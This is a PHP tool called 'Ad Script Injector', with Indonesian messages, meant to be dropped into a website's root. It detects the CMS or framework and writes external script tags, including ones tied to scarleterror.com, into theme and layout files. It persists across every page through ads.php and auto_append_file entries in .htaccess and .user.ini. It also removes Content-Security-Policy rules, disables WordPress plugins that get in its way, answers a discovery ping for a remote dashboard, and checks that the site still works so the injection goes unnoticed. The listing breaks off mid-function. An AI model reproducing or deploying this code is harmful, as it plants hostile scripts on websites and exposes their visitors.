  <?php
  /**
   * Ad Script Injector
   * Upload ke root website → buka di browser → detect otomatis → inject.
   */

  // ── Auto-discovery ping (used by dashboard to find this file's path) ──
  if (isset($_GET['_ping'])) {
      header('X-Detector: 1');
      header('Content-Type: application/json');
      echo json_encode(['ok' => 1, 'path' => isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '']);
      exit;
  }

  // ─── Detection ───────────────────────────────────────────────────────────────
  $root       = findCmsRoot(__DIR__);
  $platform   = detectPlatform($root);
  $target     = getInjectTarget($root, $platform);
  $status     = $target ? checkStatus($target['abs']) : 'no-file';
  $existing   = ($status === 'injected' && $target)
                  ? readExistingBlock($target['abs'], $platform['slug'])
                  : null;
  $htActive   = checkHtaccessInject($root);
  $blockers   = detectBlockers($root, $platform);

  // ─── Actions ─────────────────────────────────────────────────────────────────
  $flash        = null;
  $verifyResult = null;

  if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['act'])) {
      switch ($_POST['act']) {

          case 'verify':
              $verifyResult = verifyInjection(getSiteUrl());
              break;

          case 'inject':
          case 'update':
              if (!$target) { $flash = e('File inject tidak ditemukan.'); break; }
              $raw = trim(isset($_POST['scripts']) ? $_POST['scripts'] : '');
              if (!$raw) { $flash = e('Tempelkan kode script terlebih dahulu.'); break; }
              $res = doInject($target, $platform['slug'], $raw);
              if ($res === true) {
                  $vr = verifyInjection(getSiteUrl());
                  if (!$vr['ok']) {
                      // Gagal fetch — tidak bisa verifikasi, tapi bukan berarti site rusak
                      $status       = 'injected';
                      $existing     = readExistingBlock($target['abs'], $platform['slug']);
                      $flash        = ok('✔ Inject ke ' . $target['rel'] . ' selesai. (Verifikasi otomatis gagal: ' . $vr['error'] . ')');
                  } elseif (!empty($vr['phpError']) || (isset($vr['httpCode']) && $vr['httpCode'] >= 400)) {
                      // Website rusak setelah inject → rollback otomatis
                      doRemove($target, $platform['slug']);
                      $status  = 'clean';
                      $existing = null;
                      $target   = null;
                      if (!empty($vr['phpError'])) {
                          $flash = e('❌ DIBATALKAN OTOMATIS: PHP Error terdeteksi setelah inject (' . $vr['phpErrMsg'] . '). File sudah dikembalikan ke semula. Coba file lain.');
                      } else {
                          $flash = e('❌ DIBATALKAN OTOMATIS: Website error HTTP ' . (int)$vr['httpCode'] . ' setelah inject. File sudah dikembalikan ke semula. Coba file lain.');
                      }
                  } else {
                      // Website OK → inject dianggap berhasil
                      $status   = 'injected';
                      $existing = readExistingBlock($target['abs'], $platform['slug']);
                      // Otomatis inject .htaccess/auto_append_file supaya semua halaman kena
                      $htRes = doHtaccessInject($root, $raw);
                      if ($htRes === true) {
                          // Verifikasi ulang setelah htaccess inject
                          $vr2 = verifyInjection(getSiteUrl());
                          if (!empty($vr2['phpError']) || (isset($vr2['httpCode']) && $vr2['httpCode'] >= 400)) {
                              // .htaccess merusak site → rollback htaccess saja
                              doHtaccessRemove($root);
                              $htActive = false;
                              $htNote   = ' [.htaccess dibatalkan otomatis — website error setelah auto_append]';
                              $verifyResult = $vr;
                          } else {
                              $htActive     = true;
                              $htNote       = ' + .htaccess aktif (semua halaman).';
                              $verifyResult = $vr2;
                          }
                      } else {
                          $htNote       = ' [.htaccess gagal: ' . $htRes . ']';
                          $verifyResult = $vr;
                      }
                      $flash = ok('✔ Inject berhasil ke ' . $target['rel'] . ' — website masih hidup!' . $htNote);
                  }
              } else {
                  $flash = e($res);
              }
              break;

          case 'remove':
              if (!$target) { $flash = e('File tidak ditemukan.'); break; }
              $res = doRemove($target, $platform['slug']);
              if ($res === true) {
                  $status   = 'clean';
                  $existing = null;
                  $flash    = ok('✔ Script berhasil dihapus dari file.');
              } else {
                  $flash = e($res);
              }
              break;

          case 'manual_inject':
              $manualRel = trim(isset($_POST['manualpath']) ? $_POST['manualpath'] : '');
              if (!$manualRel) { $flash = e('Masukkan path file terlebih dahulu.'); break; }
              // Resolve to absolute path
              $manualAbs = $manualRel;
              if (isset($manualRel[0]) && $manualRel[0] !== '/' && !(strlen($manualRel) >= 2 && $manualRel[1] === ':')) {
                  $manualAbs = rtrim($root, '/\\') . '/' . ltrim($manualRel, '/\\');
              }
              $manualAbs = realpath($manualAbs) ?: $manualAbs;
              if (!file_exists($manualAbs)) { $flash = e('File tidak ditemukan: ' . htmlspecialchars($manualRel)); break; }
              // Security: path must be within document root or cms root
              $docroot   = realpath(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : $root) ?: $root;
              $cmsroot   = realpath($root) ?: $root;
              if (strpos($manualAbs, $docroot) !== 0 && strpos($manualAbs, $cmsroot) !== 0) {
                  $flash = e('Path tidak diperbolehkan (di luar document root).'); break;
              }
              $ext        = strtolower(pathinfo($manualAbs, PATHINFO_EXTENSION));
              $manualType = in_array($ext, ['jsx','tsx']) ? 'jsx' : (in_array($ext, ['vue']) ? 'vue' : 'html');
              $target     = ['abs' => $manualAbs, 'rel' => relPath($root, $manualAbs), 'type' => $manualType];
              $raw = trim(isset($_POST['scripts']) ? $_POST['scripts'] : '');
              if (!$raw) { $flash = e('Tempelkan kode script terlebih dahulu.'); break; }
              if (!is_writable($manualAbs)) { $flash = e('File tidak bisa ditulis (chmod 644): ' . htmlspecialchars($manualRel)); break; }
              $res = doInject($target, $platform['slug'], $raw);
              if ($res === true) {
                  $vr = verifyInjection(getSiteUrl());
                  if (!$vr['ok']) {
                      $status       = 'injected';
                      $existing     = readExistingBlock($target['abs'], $platform['slug']);
                      $flash        = ok('✔ Inject ke ' . $target['rel'] . ' selesai. (Verifikasi otomatis gagal: ' . $vr['error'] . ')');
                  } elseif (!empty($vr['phpError']) || (isset($vr['httpCode']) && $vr['httpCode'] >= 400)) {
                      doRemove($target, $platform['slug']);
                      $status   = 'clean';
                      $existing = null;
                      $target   = null;
                      if (!empty($vr['phpError'])) {
                          $flash = e('❌ DIBATALKAN OTOMATIS: PHP Error setelah inject (' . $vr['phpErrMsg'] . '). File sudah dikembalikan. Coba file lain.');
                      } else {
                          $flash = e('❌ DIBATALKAN OTOMATIS: Website error HTTP ' . (int)$vr['httpCode'] . ' setelah inject. File sudah dikembalikan. Coba file lain.');
                      }
                  } else {
                      $status   = 'injected';
                      $existing = readExistingBlock($target['abs'], $platform['slug']);
                      // Otomatis inject .htaccess/auto_append_file supaya semua halaman kena
                      $htRes = doHtaccessInject($root, $raw);
                      if ($htRes === true) {
                          // Verifikasi ulang setelah htaccess inject
                          $vr2 = verifyInjection(getSiteUrl());
                          if (!empty($vr2['phpError']) || (isset($vr2['httpCode']) && $vr2['httpCode'] >= 400)) {
                              // .htaccess merusak site → rollback htaccess saja
                              doHtaccessRemove($root);
                              $htActive = false;
                              $htNote   = ' [.htaccess dibatalkan otomatis — website error setelah auto_append]';
                              $verifyResult = $vr;
                          } else {
                              $htActive     = true;
                              $htNote       = ' + .htaccess aktif (semua halaman).';
                              $verifyResult = $vr2;
                          }
                      } else {
                          $htNote       = ' [.htaccess gagal: ' . $htRes . ']';
                          $verifyResult = $vr;
                      }
                      $flash = ok('✔ Inject berhasil ke ' . $target['rel'] . ' — website masih hidup!' . $htNote);
                  }
              } else {
                  $target = null;
                  $flash  = e($res);
              }
              break;

          case 'htaccess_inject':
              $raw = trim(isset($_POST['scripts']) ? $_POST['scripts'] : '');
              if (!$raw) { $flash = e('Tempelkan kode script terlebih dahulu.'); break; }
              $res = doHtaccessInject($root, $raw);
              if ($res === true) {
                  $vr = verifyInjection(getSiteUrl());
                  if (!$vr['ok']) {
                      $htActive = true;
                      $flash    = ok('✔ .htaccess/.user.ini diupdate. (Verifikasi otomatis gagal: ' . $vr['error'] . ')');
                  } elseif (!empty($vr['phpError']) || (isset($vr['httpCode']) && $vr['httpCode'] >= 400)) {
                      doHtaccessRemove($root);
                      $htActive = false;
                      if (!empty($vr['phpError'])) {
                          $flash = e('❌ DIBATALKAN OTOMATIS: PHP Error setelah .htaccess inject (' . $vr['phpErrMsg'] . '). Semua file sudah dikembalikan.');
                      } else {
                          $flash = e('❌ DIBATALKAN OTOMATIS: Website error HTTP ' . (int)$vr['httpCode'] . ' setelah .htaccess inject. Semua file sudah dikembalikan.');
                      }
                  } else {
                      $htActive     = true;
                      $verifyResult = $vr;
                      $flash        = ok('✔ .htaccess inject berhasil — website masih hidup! Script aktif di semua halaman PHP.');
                  }
              } else {
                  $flash = e($res);
              }
              break;

          case 'htaccess_remove':
              doHtaccessRemove($root);
              $htActive = false;
              $flash    = ok('✔ Auto-append dihapus: ads.php dihapus dan .htaccess dibersihkan.');
              break;

          case 'remove_htaccess_csp':
              $res = removeCspFromHtaccess($root);
              if ($res === true) {
                  $blockers = detectBlockers($root, $platform);
                  $flash    = ok('✔ Content-Security-Policy berhasil dihapus dari .htaccess.');
              } else {
                  $flash = e($res);
              }
              break;

          case 'disable_wp_plugin':
              $slug = isset($_POST['plugin_slug']) ? trim($_POST['plugin_slug']) : '';
              if (!$slug) { $flash = e('Nama plugin tidak ditemukan.'); break; }
              $res = disableWpPlugin($root, $slug);
              if ($res === true) {
                  $blockers = detectBlockers($root, $platform);
                  $flash    = ok('✔ Plugin "' . htmlspecialchars($slug) . '" dinonaktifkan (folder direname ke _disabled).');
              } else {
                  $flash = e($res);
              }
              break;
      }
  }

  renderPage($root, $platform, $target, $status, $existing, $flash, $verifyResult, $htActive, $blockers);
  exit;

  // =============================================================================
  // LOGIC
  // =============================================================================

  function e($t)  { return ['type' => 'error',   'text' => $t]; }
  function ok($t) { return ['type' => 'success', 'text' => $t]; }

  // ─── CMS Root ────────────────────────────────────────────────────────────────
  function findCmsRoot($startDir) {
      $dir = realpath($startDir) ?: $startDir;
      for ($i = 0; $i < 8; $i++) {
          if (file_exists("$dir/wp-config.php")      && is_dir("$dir/wp-includes"))       return $dir;
          if (file_exists("$dir/configuration.php")  && is_dir("$dir/components"))        return $dir;
          if (file_exists("$dir/artisan")            && is_dir("$dir/resources/views"))   return $dir;
          if (file_exists("$dir/spark")              && is_dir("$dir/app/Views"))         return $dir;
        if (file_exists("$dir/core/lib/Drupal.php") && is_dir("$dir/sites"))             return $dir;
        // Next.js
        if (file_exists("$dir/package.json") && (
            file_exists("$dir/next.config.js") || file_exists("$dir/next.config.mjs") || file_exists("$dir/next.config.ts")
        )) return $dir;
        // Nuxt
        if (file_exists("$dir/package.json") && (
            file_exists("$dir/nuxt.config.js") || file_exists("$dir/nuxt.config.ts")
        )) return $dir;
        // React / Vue (generic)
        if (file_exists("$dir/package.json") && (is_dir("$dir/src") || file_exists("$dir/public/index.html"))) return $dir;
        $parent = dirname($dir);
        if ($parent === $dir) break;
        $dir = $parent;
      }
      // Fallback: coba DOCUMENT_ROOT (works even if no CMS marker found)
      $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : null;
      if ($docRoot && is_dir($docRoot)) return $docRoot;
      return realpath($startDir) ?: $startDir;
  }

  // ─── Platform Detection ──────────────────────────────────────────────────────
  function detectPlatform($root) {
      // WordPress
      if (file_exists("$root/wp-config.php") && is_dir("$root/wp-includes")) {
          $ver = null;
          $vf  = "$root/wp-includes/version.php";
          if (file_exists($vf)) {
              preg_match('/\$wp_version\s*=\s*[\'"]([^\'"]+)[\'"]/', file_get_contents($vf), $m);
              $ver = isset($m[1]) ? $m[1] : null;
          }
          // Try DB first, fall back to heuristic
          $theme = wpActiveThemeFromDb($root);
          if (!$theme) {
              $styles = glob("$root/wp-content/themes/*/style.css") ?: [];
              if ($styles) {
                  usort($styles, function($a, $b) { return filemtime($b) - filemtime($a); });
                  $theme = basename(dirname($styles[0]));
              }
          }
          return ['slug' => 'wordpress', 'name' => 'WordPress', 'version' => $ver, 'theme' => $theme, 'method' => 'wp_footer'];
      }

      // Joomla
      if (file_exists("$root/configuration.php") && is_dir("$root/components")) {
          $tmpl = joomlaActiveTemplateFromDb($root);
          if (!$tmpl) {
              $idx = glob("$root/templates/*/index.php") ?: [];
              if ($idx) {
                  usort($idx, function($a, $b) { return filemtime($b) - filemtime($a); });
                  $tmpl = basename(dirname($idx[0]));
              }
          }
          return ['slug' => 'joomla', 'name' => 'Joomla', 'version' => null, 'theme' => $tmpl, 'method' => 'before </body>'];
      }

      // Laravel
      if (file_exists("$root/artisan") && is_dir("$root/resources/views")) {
          return ['slug' => 'laravel', 'name' => 'Laravel', 'version' => null, 'theme' => null, 'method' => 'before </body>'];
      }

      // CodeIgniter 4
      if (file_exists("$root/spark") && is_dir("$root/app/Views")) {
          return ['slug' => 'ci4', 'name' => 'CodeIgniter 4', 'version' => null, 'theme' => null, 'method' => 'before </body>'];
      }

      // Drupal
      if (file_exists("$root/core/lib/Drupal.php") && is_dir("$root/sites")) {
          $ver = null;
          $vf  = "$root/core/lib/Drupal.php";
          if (file_exists($vf)) {
              preg_match('/const\s+VERSION\s*=\s*[\'"]([^\'"]+)[\'"]/', file_get_contents($vf), $vm);
              $ver = isset($vm[1]) ? $vm[1] : null;
          }
          $theme = drupalActiveThemeFromDb($root);
          if (!$theme) {
              foreach (array("$root/themes", "$root/web/themes") as $td) {
                  if (!is_dir($td)) continue;
                  $dirs = array_filter(glob("$td/*/") ?: array(), 'is_dir');
                  if ($dirs) {
                      usort($dirs, function($a, $b) { return filemtime($b) - filemtime($a); });
                      $theme = basename(rtrim($dirs[0], '/\\'));
                      break;
                  }
              }
          }
          return ['slug' => 'drupal', 'name' => 'Drupal', 'version' => $ver, 'theme' => $theme, 'method' => 'before </body>'];
      }

      // JS Frameworks — read package.json
      if (file_exists("$root/package.json")) {
          $pkg  = json_decode(@file_get_contents("$root/package.json"), true) ?: array();
          $deps = array_merge(isset($pkg['dependencies']) ? $pkg['dependencies'] : array(),
                              isset($pkg['devDependencies']) ? $pkg['devDependencies'] : array());
          $cv   = function($k) use ($deps) {
              return isset($deps[$k]) ? (preg_replace('/[^0-9.]/', '', $deps[$k]) ?: null) : null;
          };

          // Next.js
          if (isset($deps['next']) || file_exists("$root/next.config.js") || file_exists("$root/next.config.mjs") || file_exists("$root/next.config.ts")) {
              return array('slug' => 'nextjs', 'name' => 'Next.js', 'version' => $cv('next'), 'theme' => null, 'method' => 'layout.tsx / out/index.html');
          }
          // Nuxt
          if (isset($deps['nuxt']) || isset($deps['nuxt3']) || file_exists("$root/nuxt.config.js") || file_exists("$root/nuxt.config.ts")) {
              $nuxtVer = $cv('nuxt');
              if (!$nuxtVer) $nuxtVer = $cv('nuxt3');
              return array('slug' => 'nuxt', 'name' => 'Nuxt', 'version' => $nuxtVer, 'theme' => null, 'method' => 'app.vue / dist/index.html');
          }
          // Vue.js
          if (isset($deps['vue'])) {
              return array('slug' => 'vue', 'name' => 'Vue.js', 'version' => $cv('vue'), 'theme' => null, 'method' => 'public/index.html');
          }
          // React
          if (isset($deps['react'])) {
              return array('slug' => 'react', 'name' => 'React', 'version' => $cv('react'), 'theme' => null, 'method' => 'public/index.html');
          }
      }

      // Generic PHP
      return ['slug' => 'php', 'name' => 'PHP', 'version' => null, 'theme' => null, 'method' => 'before </body>'];
  }

  // ─── Find Inject Target ──────────────────────────────────────────────────────
  function getInjectTarget($root, $platform) {
      $slug = $platform['slug'];

      if ($slug === 'wordpress') {
          $theme = $platform['theme'];
          $file  = $theme ? "$root/wp-content/themes/$theme/functions.php" : null;
          if (!$file || !file_exists($file)) {
              $funcs = glob("$root/wp-content/themes/*/functions.php") ?: array();
              if ($funcs) { usort($funcs, function($a, $b) { return filemtime($b) - filemtime($a); }); $file = $funcs[0]; }
          }
          if (!$file || !file_exists($file)) return null;
          return ['abs' => $file, 'rel' => relPath($root, $file), 'type' => 'php'];
      }

      if ($slug === 'joomla') {
          $tmpl = $platform['theme'];
          $file  = $tmpl ? "$root/templates/$tmpl/index.php" : null;
          if (!$file || !file_exists($file)) {
              $idx = glob("$root/templates/*/index.php") ?: array();
              if ($idx) { usort($idx, function($a, $b) { return filemtime($b) - filemtime($a); }); $file = $idx[0]; }
          }
          if (!$file || !file_exists($file)) return null;
          return ['abs' => $file, 'rel' => relPath($root, $file), 'type' => 'html'];
      }

      if ($slug === 'laravel') {
          $candidates = [
              "$root/resources/views/layouts/app.blade.php",
              "$root/resources/views/layouts/master.blade.php",
              "$root/resources/views/layouts/main.blade.php",
              "$root/resources/views/app.blade.php",
          ];
          foreach ($candidates as $f) {
              if (file_exists($f)) return ['abs' => $f, 'rel' => relPath($root, $f), 'type' => 'html'];
          }
          $blades = array_merge(
              glob("$root/resources/views/**/*.blade.php") ?: [],
              glob("$root/resources/views/*.blade.php")   ?: []
          );
          foreach ($blades as $f) {
              if (file_exists($f) && stripos(@file_get_contents($f), '</body>') !== false)
                  return ['abs' => $f, 'rel' => relPath($root, $f), 'type' => 'html'];
          }
          return null;
      }

      if ($slug === 'ci4') {
          foreach (glob("$root/app/Views/*.php") ?: [] as $f) {
              if (stripos(@file_get_contents($f), '</body>') !== false)
                  return ['abs' => $f, 'rel' => relPath($root, $f), 'type' => 'html'];
          }
          return null;
      }

      // Drupal — html.html.twig of active theme
      if ($slug === 'drupal') {
          $theme = $platform['theme'];
          $searchBases = ["$root/themes", "$root/themes/custom", "$root/themes/contrib", "$root/web/themes", "$root/web/themes/custom"];
          if ($theme) {
              foreach ($searchBases as $base) {
                  foreach (["templates/html.html.twig", "templates/layout/html.html.twig"] as $tf) {
                      $f = "$base/$theme/$tf";
                      if (file_exists($f)) return ['abs' => $f, 'rel' => relPath($root, $f), 'type' => 'html'];
                  }
              }
          }
          // Fallback: any html.html.twig
          foreach (["$root/themes", "$root/web/themes"] as $td) {
              if (!is_dir($td)) continue;
              $twigs = array_merge(
                  glob("$td/*/templates/html.html.twig")        ?: array(),
                  glob("$td/*/templates/layout/html.html.twig") ?: array(),
                  glob("$td/custom/*/templates/html.html.twig") ?: array()
              );
              if ($twigs) {
                  usort($twigs, function($a, $b) { return filemtime($b) - filemtime($a); });
                  return ['abs' => $twigs[0], 'rel' => relPath($root, $twigs[0]), 'type' => 'html'];
              }
          }
          return null;
      }

      // Next.js
      if ($slug === 'nextjs') {
          // 1. Static export
          if (file_exists("$root/out/index.html"))
              return ['abs' => "$root/out/index.html", 'rel' => '/out/index.html', 'type' => 'html'];
          // 2. App Router layout (has </body> in JSX)
          foreach (["app", "src/app"] as $dir) {
              foreach (["tsx", "jsx", "ts", "js"] as $ext) {
                  $f = "$root/$dir/layout.$ext";
                  if (file_exists($f)) return ['abs' => $f, 'rel' => "/$dir/layout.$ext", 'type' => 'jsx'];
              }
          }
          // 3. Pages Router _document
          foreach (["pages", "src/pages"] as $dir) {
              foreach (["tsx", "jsx", "ts", "js"] as $ext) {
                  $f = "$root/$dir/_document.$ext";
                  if (file_exists($f)) return ['abs' => $f, 'rel' => "/$dir/_document.$ext", 'type' => 'jsx'];
              }
          }
          return null;
      }

      // Nuxt
      if ($slug === 'nuxt') {
          // 1. Static output
          foreach ([".output/public/index.html", "dist/index.html", ".nuxt/dist/client/index.html"] as $f) {
              if (file_exists("$root/$f")) return ['abs' => "$root/$f", 'rel' => "/$f", 'type' => 'html'];
          }
          // 2. layouts/default.vue
          if (file_exists("$root/layouts/default.vue"))
              return ['abs' => "$root/layouts/default.vue", 'rel' => '/layouts/default.vue', 'type' => 'vue'];
          // 3. app.vue
          if (file_exists("$root/app.vue"))
              return ['abs' => "$root/app.vue", 'rel' => '/app.vue', 'type' => 'vue'];
          return null;
      }

      // React
      if ($slug === 'react') {
          foreach (["public/index.html", "build/index.html", "dist/index.html"] as $f) {
              if (file_exists("$root/$f")) return ['abs' => "$root/$f", 'rel' => "/$f", 'type' => 'html'];
          }
          return null;
      }

      // Vue.js
      if ($slug === 'vue') {
          foreach (["public/index.html", "dist/index.html"] as $f) {
              if (file_exists("$root/$f")) return ['abs' => "$root/$f", 'rel' => "/$f", 'type' => 'html'];
          }
          if (file_exists("$root/src/App.vue"))
              return ['abs' => "$root/src/App.vue", 'rel' => '/src/App.vue', 'type' => 'vue'];
          return null;
      }

      // Generic PHP — priority list then broad scan
      $fixedCandidates = [
          "$root/footer.php",
          "$root/includes/footer.php", "$root/inc/footer.php",
          "$root/template/footer.php", "$root/templates/footer.php",
          "$root/header.php",
          "$root/includes/header.php", "$root/inc/header.php",
          "$root/index.php",
          "$root/home.php", "$root/main.php", "$root/default.php",
      ];
      foreach ($fixedCandidates as $f) {
          if (!file_exists($f)) continue;
          if (realpath($f) === realpath(__FILE__)) continue;
          $c = @file_get_contents($f);
          if ($c && stripos($c, '</body>') !== false)
              return ['abs' => $f, 'rel' => relPath($root, $f), 'type' => 'html'];
      }
      // Scan root *.php
      foreach (glob("$root/*.php") ?: [] as $f) {
          if (realpath($f) === realpath(__FILE__)) continue;
          $c = @file_get_contents($f);
          if ($c && stripos($c, '</body>') !== false)
              return ['abs' => $f, 'rel' => relPath($root, $f), 'type' => 'html'];
      }
      // Scan one level deep in common theme/template dirs
      $subDirs = ['templates', 'template', 'themes', 'theme', 'includes',
                  'inc', 'views', 'layouts', 'partials', 'pages', 'html'];
      foreach ($subDirs as $sd) {
          foreach (glob("$root/$sd/*.php") ?: [] as $f) {
              $c = @file_get_contents($f);
              if ($c && stripos($c, '</body>') !== false)
                  return ['abs' => $f, 'rel' => relPath($root, $f), 'type' => 'html'];
          }
          foreach (glob("$root/$sd/*.html") ?: [] as $f) {
              $c = @file_get_contents($f);
              if ($c && stripos($c, '</body>') !== false)
                  return ['abs' => $f, 'rel' => relPath($root, $f), 'type' => 'html'];
          }
      }
      // Scan root *.html
      foreach (glob("$root/*.html") ?: [] as $f) {
          $c = @file_get_contents($f);
          if ($c && stripos($c, '</body>') !== false)
              return ['abs' => $f, 'rel' => relPath($root, $f), 'type' => 'html'];
      }
      return null;
  }

  // ─── Status / Read ───────────────────────────────────────────────────────────
  function checkStatus($filePath) {
      if (!file_exists($filePath)) return 'no-file';
      $c = @file_get_contents($filePath);
      if ($c === false) return 'no-read';
      return (strpos($c, 'AD-INJ-START') !== false || strpos($c, 'scarleterror.com') !== false) ? 'injected' : 'clean';
  }

  function readExistingBlock($file, $slug) {
      $c = @file_get_contents($file);
      if (!$c) return null;
      if ($slug === 'wordpress') {
          preg_match('/\/\* AD-INJ-START \*\/(.+?)\/\* AD-INJ-END \*\//s', $c, $m);
          return isset($m[1]) ? trim($m[1]) : null;
      }
      if ($slug === 'nextjs') {
          preg_match('/\{\/\* AD-INJ-START \*\/\}(.+?)\{\/\* AD-INJ-END \*\/\}/s', $c, $m);
          return isset($m[1]) ? trim($m[1]) : null;
      }
      // HTML / PHP / Vue — no markers, extract script tags with scarleterror.com
      if (preg_match_all('/<script[^>]+src=["\'][^"\']*scarleterror\.com[^"\']*["\'][^>]*>(?:\s*<\/script>)?/i', $c, $m)) {
          return trim(implode("\n", $m[0]));
      }
      // Fallback: legacy marker format
      preg_match('/<!-- AD-INJ-START -->(.+?)<!-- AD-INJ-END -->/s', $c, $m);
      return isset($m[1]) ? trim($m[1]) : null;
  }

  // ─── Inject / Remove ─────────────────────────────────────────────────────────
  function doInject($target, $slug, $rawScripts) {
      $file = $target['abs'];
      if (!file_exists($file))  return 'File tidak ditemukan: '  . $target['rel'];
      if (!is_writable($file))  return 'File tidak bisa ditulis (chmod 644): ' . $target['rel'];

      $content = file_get_contents($file);
      if ($content === false)   return 'Gagal membaca file.';

      // Parse <script src="..."> tags from input
      preg_match_all('/<script[^>]+src=[\'"]([^\'"]+)[\'"][^>]*>/i', $rawScripts, $matches);
      $urls = array_values(array_filter(isset($matches[1]) ? $matches[1] : array()));

      // Remove existing block first
      $content = removeBlock($content, $slug);

      if ($slug === 'wordpress') {
          if ($urls) {
              $echos = implode("\n", array_map(
                  function($u) { return "    echo '<script src=\"" . addslashes($u) . "\"></script>' . \"\\n\";"; },
                  $urls
              ));
          } else {
              $echos = "    echo '" . addslashes(trim($rawScripts)) . "';";
          }
          $block   = "\n/* AD-INJ-START */\nadd_action('wp_footer', function() {\n{$echos}\n}, 99);\n/* AD-INJ-END */\n";
          $content = rtrim($content) . "\n" . $block;

      } elseif ($target['type'] === 'jsx') {
          // Next.js JSX/TSX — use {/* */} comments
          if ($urls) {
              $tags = implode("\n", array_map(
                  function($u) { return '<script src="' . htmlspecialchars($u, ENT_QUOTES) . '" async></script>'; },
                  $urls
              ));
          } else {
              $tags = trim($rawScripts);
          }
          $block = "\n{/* AD-INJ-START */}\n{$tags}\n{/* AD-INJ-END */}";
          if (stripos($content, '</body>') !== false) {
              $content = preg_replace('/<\/body>/i', $block . "\n</body>", $content, 1);
          } elseif (stripos($content, '</html>') !== false) {
              $content = preg_replace('/<\/html>/i', $block . "\n</html>", $content, 1);
          } else {
              $content = rtrim($content) . "\n" . $block;
          }

      } elseif ($target['type'] === 'vue') {
          // Vue SFC — inject before </body> → </template> → append
          if ($urls) {
              $tags = implode("\n", array_map(
                  function($u) { return '<script src="' . htmlspecialchars($u, ENT_QUOTES) . '" async></script>'; },
                  $urls
              ));
          } else {
              $tags = trim($rawScripts);
          }
          $block = "\n{$tags}";
          if (stripos($content, '</body>') !== false) {
              $content = preg_replace('/<\/body>/i', $block . "\n</body>", $content, 1);
          } elseif (stripos($content, '</html>') !== false) {
              $content = preg_replace('/<\/html>/i', $block . "\n</html>", $content, 1);
          } elseif (stripos($content, '</template>') !== false) {
              $pos     = strripos($content, '</template>');
              $content = substr($content, 0, $pos) . $block . "\n" . substr($content, $pos);
          } else {
              $content = rtrim($content) . "\n" . $block;
          }

      } else {
          if ($urls) {
              $tags = implode("\n", array_map(
                  function($u) { return '<script src="' . htmlspecialchars($u, ENT_QUOTES) . '"></script>'; },
                  $urls
              ));
          } else {
              $tags = trim($rawScripts);
          }
          $block = "\n{$tags}";
          if (stripos($content, '</body>') !== false) {
              $content = preg_replace('/<\/body>/i', $block . "\n</body>", $content, 1);
          } elseif (stripos($content, '</html>') !== false) {
              $content = preg_replace('/<\/html>/i', $block . "\n</html>", $content, 1);
          } else {
              $content = rtrim($content) . "\n" . $block;
          }
      }

      return (file_put_contents($file, $content) !== false) ? true : 'Gagal menulis file.';
  }

  function doRemove($target, $slug) {
      $file = $target['abs'];
      if (!file_exists($file)) return 'File tidak ditemukan.';
      if (!is_writable($file)) return 'File tidak bisa ditulis (chmod 644).';

      $content = file_get_contents($file);
      if ($content === false)  return 'Gagal membaca file.';

      $new = removeBlock($content, $slug);
      if ($new === $content)   return 'Blok inject tidak ditemukan dalam file.';

      return (file_put_contents($file, $new) !== false) ? true : 'Gagal menulis file.';
  }

  function removeBlock($content, $slug) {
      if ($slug === 'wordpress') {
          return preg_replace('/\n?\/\* AD-INJ-START \*\/.+?\/\* AD-INJ-END \*\//s', '', $content);
      }
      if ($slug === 'nextjs') {
          return preg_replace('/\n?\{\/\* AD-INJ-START \*\/\}.+?\{\/\* AD-INJ-END \*\/\}/s', '', $content);
      }
      // HTML / PHP / Vue — remove legacy markers OR bare scarleterror script tags
      $content = preg_replace('/\n?<!-- AD-INJ-START -->.+?<!-- AD-INJ-END -->/s', '', $content);
      $content = preg_replace('/\n?<script[^>]+scarleterror\.com[^>]*>(?:\s*<\/script>)?/i', '', $content);
      return $content;
  }

  // ─── .htaccess Auto-Append Inject ────────────────────────────────────────────
  function checkHtaccessInject($root) {
      $pf = "$root/ads.php";
      if (!file_exists($pf)) return false;
      $ht = "$root/.htaccess";
      if (file_exists($ht)) {
          $htc = @file_get_contents($ht);
          if ($htc && strpos($htc, 'AD-INJ-START') !== false && strpos($htc, 'ads.php') !== false)
              return true;
      }
      $ui = "$root/.user.ini";
      if (file_exists($ui)) {
          $uic = @file_get_contents($ui);
          if ($uic && stripos($uic, 'auto_append_file') !== false && strpos($uic, 'ads.php') !== false)
              return true;
      }
      return false;
  }

  function doHtaccessInject($root, $rawScripts) {
      $pushFile = $root . '/ads.php';
      $htFile   = $root . '/.htaccess';
      $uiFile   = $root . '/.user.ini';

      // Parse <script src="..."> tags
      preg_match_all('/<script[^>]+src=[\'"]([^\'"]+)[\'"][^>]*>/i', $rawScripts, $matches);
      $urls = array_values(array_filter(isset($matches[1]) ? $matches[1] : array()));

      // Build ads.php — pakai ob_get_clean() supaya script masuk sebelum </body>
      if ($urls) {
          $scriptLines = '';
          foreach ($urls as $u) {
              $scriptLines .= "<script src=\\\"" . addslashes($u) . "\\\"></script>\\n";
          }
      } else {
          $scriptLines = addslashes(trim($rawScripts));
      }
      $php = '<?php' . "\n"
           . '$__s = "' . $scriptLines . '";' . "\n"
           . 'if (ob_get_level() > 0) {' . "\n"
           . '    $__o = ob_get_clean();' . "\n"
           . '    if (stripos($__o, "</body>") !== false) {' . "\n"
           . '        $__o = preg_replace("/<\\/body>/i", $__s . "\n</body>", $__o, 1);' . "\n"
           . '    } elseif (stripos($__o, "</html>") !== false) {' . "\n"
           . '        $__o = preg_replace("/<\\/html>/i", $__s . "\n</html>", $__o, 1);' . "\n"
           . '    } else { $__o .= "\n" . $__s; }' . "\n"
           . '    echo $__o;' . "\n"
           . '} else { echo "\n" . $__s; }' . "\n";


      if (file_put_contents($pushFile, $php) === false)
          return 'Gagal membuat ads.php — pastikan folder root writable.';

      $absPush = realpath($pushFile) ?: $pushFile;
      $absPush = str_replace('\\', '/', $absPush);

      // ── .user.ini — PHP-FPM / CGI ────────────────────────────────────────
      $uic = file_exists($uiFile) ? (@file_get_contents($uiFile) ?: '') : '';
      $uic = preg_replace('/\nauto_append_file\s*=[^\n]*/i', '', $uic);
      $uic = rtrim($uic) . "\nauto_append_file = \"$absPush\"\n";
      @file_put_contents($uiFile, $uic); // soft fail — FPM may not honour this file

      // ── .htaccess — Apache mod_php only (wrapped so non-mod_php won't 500)
      $htc   = file_exists($htFile) ? (@file_get_contents($htFile) ?: '') : '';
      // Remove previous block
